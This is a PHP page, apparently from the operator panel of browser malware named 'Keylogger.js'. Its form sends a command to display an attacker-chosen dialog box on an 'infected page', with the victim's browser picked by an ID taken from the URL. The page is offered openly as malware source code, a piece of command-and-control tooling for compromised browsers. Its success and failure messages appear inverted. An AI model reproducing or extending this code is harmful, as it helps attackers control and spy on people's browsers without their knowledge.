<?php
    include_once('../../inc/commands.inc.php');

    if(isset($_POST['command']) && $_POST['command'] == 'disaplyDialogBox') {
        if(!displayDialogBox($_GET['browserId'], $_POST['message'])) {
            $execCommand = "Command sent successfull";
        }
        else {
            $execCommand = "Error while sending command";
        }
    }
?>

<html>
    <head>
        <meta charset="UTF-8">
        <title>Keylogger.js</title>
    </head>
    <body>
        <div>
            <p>
                This command display a dialog box on the infected page
            </p>
            <div>
                <?php
                    if(isset($execCommand)) {
                        echo $execCommand;
                    }
                ?>
            </div>
            <div>
                <form action="" method="POST">
                    <div>
                        <label for="name">Enter the dialog box message: </label>
                        <input type="text" name="message"/>
                    </div>
                    <div>
                        <input type="hidden" name="command" value="disaplyDialogBox"/>
                        <button type="submit" name="execute">Execute</button>
                    </div>                       
                </form>
            </div>
        </div>
    </body>
</html>